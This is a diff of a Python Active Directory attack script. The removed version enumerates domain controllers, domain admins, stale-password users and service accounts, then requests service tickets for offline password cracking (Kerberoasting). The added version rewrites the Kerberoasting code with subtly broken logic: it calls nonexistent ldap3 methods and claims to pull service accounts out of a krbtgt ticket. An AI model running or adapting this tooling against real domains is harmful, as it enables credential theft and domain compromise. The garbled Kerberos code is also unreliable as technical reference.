@@ -1,60 +1,118 @@
 import dns.resolver
 import ldap3
-from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGS
-import requests
-import sys
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import AP_REQ, TGS_REQ
+from impacket.krb5.types import Principal, KerberosTime, Ticket
+from impacket.ntlm import compute_lmhash, compute_nthash
 
-def check_weak_passwords(username, password, domain):
+def discover_domain_controllers(domain):
     try:
-        server = ldap3.Server(domain, get_info=ldap3.ALL)
-        conn = ldap3.Connection(server, user=username, password=password)
-        if not conn.bind():
-            print("Failed to authenticate with provided credentials.")
-            return
+        srv_records = dns.resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
+        domain_controllers = []
 
-        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
-                    search_filter='(&(objectClass=user)(pwdLastSet<=12960000000000000))',  # Password last set more than 150 days ago
-                    search_scope=ldap3.SUBTREE,
-                    attributes=['sAMAccountName'])
+        for record in srv_records:
+            domain_controller = {
+                'hostname': str(record.target).rstrip('.'),
+                'port': record.port,
+            }
+            domain_controllers.append(domain_controller)
 
-        if conn.entries:
-            print("Users with Weak Passwords:")
-            for entry in conn.entries:
-                print(entry.sAMAccountName.value)
-        else:
-            print("No users with weak passwords found.")
+        return domain_controllers
 
     except Exception as e:
-        print(f"Error while checking weak passwords: {e}")
+        print(f"Error while discovering domain controllers: {e}")
+        return []
 
-def check_for_persistence(username, password, domain):
+def kerberoast(domain, username, password, domain_controllers):
     try:
-        server = ldap3.Server(domain, get_info=ldap3.ALL)
-        conn = ldap3.Connection(server, user=username, password=password)
-        if not conn.bind():
-            print("Failed to authenticate with provided credentials.")
-            return
+        for dc in domain_controllers:
+            print(f"Attempting to Kerberoast accounts from {dc['hostname']}")
 
-        conn.search(search_base='CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
-                    search_filter='(objectClass=serviceConnectionPoint)',
-                    search_scope=ldap3.SUBTREE,
-                    attributes=['serviceBindingInformation'])
-
-        if conn.entries:
-            print("Services with Persistence:")
-            for entry in conn.entries:
-                print(entry.serviceBindingInformation.value)
-        else:
-            print("No services with persistence found.")
+            target = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            krbtgt_ticket = get_ticket(username, password, domain, target, dc['hostname'], dc['port'])
+            
+            if krbtgt_ticket:
+                print("Successfully obtained krbtgt ticket.")
+                
+                # Extract usernames of kerberoastable accounts from the TGT
+                kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
+                if kerberoastable_accounts:
+                    print("Kerberoastable Accounts:")
+                    for account in kerberoastable_accounts:
+                        print(account)
+                else:
+                    print("No kerberoastable accounts found.")
+            else:
+                print("Failed to obtain krbtgt ticket.")
 
     except Exception as e:
-        print(f"Error while checking for persistence: {e}")
+        print(f"Error while Kerberoasting: {e}")
 
-def find_esc1_certificate_templates(username, password, domain):
+def get_ticket(username, password, domain, target, hostname, port):
     try:
-        domain_controllers = discover_domain_controllers(domain)
+        # Connect to the DC
+        server = ldap3.Server(hostname, port=port, get_info=ldap3.ALL)
+        conn = ldap3.Connection(server, user=username, password=password)
+        if not conn.bind():
+            print(f"Failed to authenticate with provided credentials to {hostname}.")
+            return None
 
+        # Create AP-REQ message
+        ccache = conn.toTGT(username, password, domain)
+        creds = ccache.credentials[0]
+        ap_req = AP_REQ()
+        ap_req['pvno'] = 5
+        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+        ap_req['ap-options'] = 0
+        ap_req['ticket'] = creds.ticket
+        ap_req['authenticator'] = creds.ticket.authenticator
+
+        # Send TGS request for krbtgt ticket
+        tgs_req = TGS_REQ()
+        tgs_req['pvno'] = 5
+        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+        tgs_req['padata'] = []
+        tgs_req['req-body'] = {
+            'kdc-options': 8,  # canonicalize
+            'sname': target,
+            'realm': domain,
+            'till': KerberosTime(0),
+            'etype': [23, 17, 18],  # RC4_HMAC, AES256, AES128
+        }
+        tgs_req['req-body']['cname'] = creds.ticket['cname']
+
+        # Send TGS request and get krbtgt ticket
+        conn.request(target, tgs_req)
+        response = conn.response
+        if response and len(response) > 0:
+            ticket = Ticket()
+            ticket.from_asn1(response[0]['response']['ticket'])
+            return ticket
+        else:
+            return None
+
+    except Exception as e:
+        print(f"Error while getting krbtgt ticket: {e}")
+        return None
+
+def extract_kerberoastable_accounts(tgt):
+    try:
+        kerberoastable_accounts = []
+
+        for ticket in tgt['enc-part']['cipher'].tickets:
+            sname = str(ticket['sname'])
+            if sname.startswith('service'):
+                service_name = sname.split('/')[1].split('@')[0]
+                kerberoastable_accounts.append(service_name)
+
+        return kerberoastable_accounts
+
+    except Exception as e:
+        print(f"Error while extracting kerberoastable accounts: {e}")
+        return []
+
+def find_esc1_certificate_templates(username, password, domain, domain_controllers):
+    try:
         for dc in domain_controllers:
             server = ldap3.Server(dc['hostname'], port=dc['port'], get_info=ldap3.ALL)
             conn = ldap3.Connection(server, user=username, password=password)
@@ -72,7 +130,7 @@ def find_esc1_certificate_templates(username, password, domain):
                         attributes=attributes)
 
             if conn.entries:
-                print(f"ESC1 certificate templates found on {dc['hostname']}:")
+                print(f"ESC1 certificate templates found on {dc['hostname']} that meet the criteria:")
                 for entry in conn.entries:
                     print(entry.displayName.value)
             else:
@@ -80,206 +138,5 @@ def find_esc1_certificate_templates(username, password, domain):
 
     except Exception as e:
         print(f"Error while searching for ESC1 certificate templates: {e}")
-        
-def get_domain_controllers(domain, username, password):
-    try:
-        # Discover LDAP servers using SRV records
-        srv_records = dns.resolver.resolve(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
-        domain_controllers = []
 
-        # Extract domain controllers' hostnames and ports from SRV records
-        for record in srv_records:
-            domain_controller = {
-                'hostname': str(record.target).rstrip('.'),
-                'port': record.port,
-                'weight': record.weight,
-                'priority': record.priority
-            }
-            domain_controllers.append(domain_controller)
-
-        return domain_controllers
-
-    except Exception as e:
-        print(f"Error while discovering domain controllers: {e}")
-        return []
-    
-def discover_domain_controllers(domain):
-    try:
-        # Discover LDAP servers using SRV records
-        srv_records = ldap3.dns.resolver.query(f'_ldap._tcp.dc._msdcs.{domain}', 'SRV')
-        domain_controllers = []
-
-        # Extract domain controllers' hostnames and ports from SRV records
-        for record in srv_records:
-            domain_controller = {
-                'hostname': str(record.target).rstrip('.'),
-                'port': record.port,
-                'weight': record.weight,
-                'priority': record.priority
-            }
-            domain_controllers.append(domain_controller)
-
-        return domain_controllers
-
-    except Exception as e:
-        print(f"Error while discovering domain controllers: {e}")
-        return []
-    
-
-def check_smb_signing_not_required_ldap(domain, username, password):
-    try:
-        domain_controllers = get_domain_controllers(domain, username, password)
-        if not domain_controllers:
-            print("No Domain Controllers found.")
-            return
-
-        for dc in domain_controllers:
-            if 1 in dc['encryption_types']:
-                print(f"Domain Controller {dc['hostname']}: SMB Signing not required.")
-            else:
-                print(f"Domain Controller {dc['hostname']}: SMB Signing required.")
-
-    except Exception as e:
-        print(f"Error while checking SMB Signing: {e}")
-
-def get_user_permissions(username, password, domain):
-    try:
-        server = ldap3.Server(domain, get_info=ldap3.ALL)
-        conn = ldap3.Connection(server, user=username, password=password)
-        if not conn.bind():
-            print("Failed to authenticate with provided credentials.")
-            return []
-
-        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
-                    search_filter=f'(&(objectClass=user)(sAMAccountName={username}))',
-                    search_scope=ldap3.SUBTREE,
-                    attributes=['memberOf'])
-
-        if conn.entries:
-            user_groups = [str(group) for group in conn.entries[0]['memberOf'].values]
-            print(f"User {username} is a member of the following groups:")
-            for group in user_groups:
-                print(group)
-            return user_groups
-        else:
-            print(f"User {username} not found.")
-            return []
-
-    except Exception as e:
-        print(f"Error while getting user permissions: {e}")
-        return []
-
-def get_domain_admins(domain, username, password):
-    try:
-        server = ldap3.Server(domain, get_info=ldap3.ALL)
-        conn = ldap3.Connection(server, user=username, password=password)
-        if not conn.bind():
-            print("Failed to authenticate with provided credentials.")
-            return []
-
-        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
-                    search_filter='(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')) + '))',
-                    search_scope=ldap3.SUBTREE,
-                    attributes=['sAMAccountName'])
-
-        if conn.entries:
-            domain_admins = [entry.sAMAccountName.value for entry in conn.entries]
-            print("Domain Admins:")
-            for admin in domain_admins:
-                print(admin)
-            return domain_admins
-        else:
-            print("No Domain Admins found.")
-            return []
-
-    except Exception as e:
-        print(f"Error while getting Domain Admins: {e}")
-        return []
-
-def get_kerberoastable_accounts(domain, username, password):
-    try:
-        server = ldap3.Server(domain, get_info=ldap3.ALL)
-        conn = ldap3.Connection(server, user=username, password=password)
-        if not conn.bind():
-            print("Failed to authenticate with provided credentials.")
-            return []
-
-        conn.search(search_base='DC=' + ','.join(f"DC={dc}" for dc in domain.split('.')),
-                    search_filter='(&(objectClass=user)(servicePrincipalName=*)(!adminCount=1))',
-                    search_scope=ldap3.SUBTREE,
-                    attributes=['sAMAccountName'])
-
-        if conn.entries:
-            kerberoastable_accounts = [entry.sAMAccountName.value for entry in conn.entries]
-            print("Kerberoastable Accounts:")
-            for account in kerberoastable_accounts:
-                print(account)
-            return kerberoastable_accounts
-        else:
-            print("No kerberoastable accounts found.")
-
-    except Exception as e:
-        print(f"Error while getting kerberoastable accounts: {e}")
-        return []
-
-def kerberoast(domain, username, password, kerberoastable_accounts):
-    try:
-        for account in kerberoastable_accounts:
-            print(f"Attempting to Kerberoast account: {account}")
-
-            # Request a service ticket (TGS) for the kerberoastable account
-            tgs, enc_part = getKerberosTGS(username, password, domain, account)
-
-            # Extract the encrypted ticket from the TGS response
-            ccache = CCache()
-            ccache.fromTGS(tgs)
-            ticket = ccache.credentials[0].ticket
-
-            # Perform offline brute-force attacks to crack the passwords
-            # Here you can implement your cracking logic, such as using dictionary attacks or hash cracking tools
-
-    except Exception as e:
-        print(f"Error while Kerberoasting: {e}")
-
-def main():
-    if len(sys.argv) != 4:
-        print("Usage: python script.py <username> <password> <domain>")
-        sys.exit(1)
-
-    username = sys.argv[1]
-    password = sys.argv[2]
-    domain = sys.argv[3]
-
-    #Check for Domain Controllers
-    discover_domain_controllers(domain)
-
-    # Check for weak passwords
-    check_weak_passwords(username, password, domain)
-
-    # Check for persistence
-    check_for_persistence(username, password, domain)
-
-    #check for esc1
-    find_esc1_certificate_templates(username, password, domain)    
-
-    # Check for machines with WebDAV enabled
-    # check_webdav_enabled(domain)
-
-    # Check for computers with SMB Signing not required using LDAP
-    check_smb_signing_not_required_ldap(domain, username, password)
-
-    # Get current user's permissions
-    get_user_permissions(username, password, domain)
-
-    # Get Domain Admins
-    get_domain_admins(domain, username, password)
-
-    # Retrieve kerberoastable accounts
-    kerberoastable_accounts = get_kerberoastable_accounts(domain, username, password)
-
-    # Execute the Kerberoasting attack
-    kerberoast(domain, username, password, kerberoastable_accounts)
-
-if __name__ == "__main__":
-    main()
 
